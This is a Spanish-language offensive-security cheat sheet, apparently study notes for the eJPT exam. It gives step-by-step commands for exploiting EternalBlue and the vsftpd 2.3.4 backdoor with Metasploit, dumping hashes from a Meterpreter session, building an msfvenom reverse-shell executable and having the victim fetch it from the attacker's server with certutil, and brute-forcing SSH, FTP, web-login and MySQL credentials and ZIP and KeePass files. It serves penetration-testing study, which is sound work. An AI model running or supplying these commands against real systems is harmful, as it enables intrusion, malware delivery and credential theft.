# 01. Uso Básico de Metasploit - Explotación EternalBlue en Windows

EternalBlue explota una vulnerabilidad en el protocolo SMB de Windows. Es una de las más famosas — fue usada en WannaCry.

```bash
msfconsole
```

```bash
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <IP víctima>
run
```

> Si el exploit falla a la primera, intenta con `set payload windows/x64/meterpreter/reverse_tcp` antes de correr.

Una vez dentro tendrás una sesión **Meterpreter** — desde ahí puedes moverte por el sistema:

```bash
sysinfo          # info del sistema
getuid           # usuario actual
hashdump         # volcar hashes de contraseñas
shell            # abrir cmd de Windows
```

# 02. Uso Básico de Metasploit - Explotación vsftpd en Linux

vsftpd 2.3.4 tiene una backdoor que abre una shell en el puerto 6200 cuando el usuario contiene `:)` en el login. Clásico en labs de Linux.

**Primero, reconocimiento:**

```bash
# Descubrir hosts en la red
arp-scan -I eth0 --localnet

# Escaneo completo al objetivo
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.1.18 -oN escaneo.txt

# Verificar si el puerto 21 es vulnerable
nmap --script vuln -p 21 192.168.1.18
```

**Luego, explotar con Metasploit:**

```bash
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS <IP víctima>
run
```

> Si obtienes una shell básica, puedes mejorarla con `python3 -c 'import pty; pty.spawn("/bin/bash")'`

# 03. Msfvenom - Generar Nuestros Propios Payloads

Cuando no puedes explotar directamente con Metasploit, generas un ejecutable malicioso, lo entregas a la víctima y esperas la conexión.

**1. Generar el payload:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP atacante> \
  LPORT=443 \
  -f exe \
  -o pwned.exe
```

| Flag     | Descripción                             |
| -------- | --------------------------------------- |
| `-p`     | Tipo de payload                         |
| `LHOST`  | Tu IP (la que recibirá la conexión)     |
| `LPORT`  | Puerto en escucha (443 pasa como HTTPS) |
| `-f exe` | Formato del archivo de salida           |
| `-o`     | Nombre del archivo generado             |

**2. Servir el archivo a la víctima:**

```bash
python3 -m http.server 80
```

La víctima descarga con: `certutil -urlcache -f http://<IP atacante>/pwned.exe pwned.exe`

**3. Ponerse en escucha ANTES de que la víctima ejecute el archivo:**

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP atacante>
set LPORT 443
run
```

> El orden importa — primero el listener, luego la víctima ejecuta el payload.

# 04. Uso de Hydra - Ataques de Fuerza Bruta a Contraseña (SSH y FTP)

Hydra prueba combinaciones de usuario/contraseña automáticamente. Útil cuando encuentras un servicio SSH o FTP sin credenciales conocidas.

**SSH:**

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://<IP víctima>
```

**FTP:**

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://<IP víctima>
```

| Flag   | Descripción                                       |
| ------ | ------------------------------------------------- |
| `-l`   | Usuario específico (si lo conoces)                |
| `-L`   | Lista de usuarios (si no lo conoces)              |
| `-p`   | Contraseña específica                             |
| `-P`   | Lista de contraseñas (wordlist)                   |
| `-t 4` | Hilos paralelos (por defecto 16, bájalo si falla) |

Si encuentras un usuario en un archivo o en la web de la máquina, úsalo con `-l`. Rockyou suele ser suficiente para los labs.

```bash
# Si no sabes el usuario, prueba con lista común
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://<IP víctima> -t 4
```

> Hydra puede ser ruidoso — en entornos reales genera muchos logs.

# 05. Uso de Hydra - Ataques de Fuerza Bruta a Usuarios (SSH y FTP)

Cuando tienes la contraseña pero no el usuario — o no tienes ninguno de los dos — puedes usar listas para ambos campos.

**Cuando sabes la contraseña pero no el usuario:**

```bash
# SSH
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://<IP víctima>

# FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://<IP víctima>
```

**Cuando no sabes ni usuario ni contraseña:**

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://<IP víctima> -t 4
```

| Flag | Descripción                                  |
| ---- | -------------------------------------------- |
| `-L` | Lista de usuarios                            |
| `-l` | Usuario específico                           |
| `-P` | Lista de contraseñas                         |
| `-p` | Contraseña específica                        |
| `-t` | Hilos paralelos (default 16, bajar si falla) |

> En el eJPT suele haber pistas sobre el usuario en la web de la máquina, en archivos expuestos o en el resultado del escaneo. Búscalos antes de hacer fuerza bruta ciega.

# 06. Uso de Hydra - Ataques de Fuerza Bruta a Paneles de Login Web

Para atacar un formulario web necesitas saber exactamente qué parámetros envía — para eso usas **Burp Suite** como intermediario.

### Paso 1 — Configurar el proxy en el navegador

En tu navegador configura el proxy manual:

- **HTTP Proxy:** `127.0.0.1`
- **Puerto:** `8080`

### Paso 2 — Interceptar la petición con Burp Suite

1. Abre Burp Suite → pestaña **Proxy** → activa **Intercept is on**
2. Intenta hacer login con cualquier credencial
3. Burp captura la petición — anota el **endpoint**, los **parámetros** y el **mensaje de error**
   Lo que necesitas identificar:

```
POST /my_weblog/admin.php
username=admin&password=test123
→ respuesta cuando falla: "Incorrect"
```

### Paso 3 — Lanzar Hydra contra el formulario

```bash
hydra -t 64 \
      -l admin \
      -P /usr/share/wordlists/rockyou.txt \
      <IP víctima> \
      http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect"
```

La estructura del último argumento es siempre:

```
"<ruta>:<parámetros con ^USER^ y/o ^PASS^>:<mensaje de error>"
```

| Parte                            | Descripción                                               |
| -------------------------------- | --------------------------------------------------------- |
| `/my_weblog/admin.php`           | Ruta del formulario                                       |
| `username=admin&password=^PASS^` | Parámetros POST — `^PASS^` es donde Hydra inyecta         |
| `Incorrect`                      | Texto que aparece cuando las credenciales son incorrectas |

> El texto de error debe ser exactamente lo que devuelve el servidor al fallar — cópialo directo desde Burp o desde el HTML de la respuesta.

**Si el login es GET en vez de POST:**

```bash
hydra -l admin -P rockyou.txt <IP> http-get-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

# 07. Ataques de Fuerza bruta con Metasploit

**FTP:**

```bash
search ftp_login
use 0
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <usuario>
set RHOSTS <IP víctima>
run
```

**SSH:**

```bash
search ssh_login
use 0
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <usuario>
set RHOSTS <IP víctima>
run
```

> Si no tienes el usuario: `set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt`

# 08. Ataques de Fuerza Bruta contra Base de Datos

```bash
# Con rockyou
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt mysql://<IP víctima>

# Con diccionario sin espacios (MySQL los rechaza)
hydra -l <usuario> -P diccionario_sin_espacios.txt mysql://<IP víctima>
```

Una vez tienes credenciales, conéctate y enumera:

```bash
mysql -h <IP víctima> -u <usuario> -p<contraseña>
```

```sql
show databases;       -- lista bases de datos
use <database>;       -- selecciona una
show tables;          -- lista tablas
SELECT * FROM users;  -- vuelca la tabla (busca hashes o contraseñas)
```

# 09. Ataques de Fuerza Bruta en Local con John The Ripper

Úsalo cuando tienes un archivo protegido o un hash en tu máquina.

**ZIP protegido:**

```bash
zip2john archivo.zip > hash                                   # extrae el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash         # crackea
john --show hash                                              # muestra la contraseña
```

**Base de datos KeePass (.kdbx):**

```bash
keepass2john Database.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash
```

**Hash suelto (MD5, SHA1...):**

```bash
hash-identifier          # identifica el tipo de hash (pega el hash y te dice cuál es)

john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
john --format=RAW-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

> Alternativa online para identificar hashes: [hashes.com](https://hashes.com/en/tools/hash_identifier)
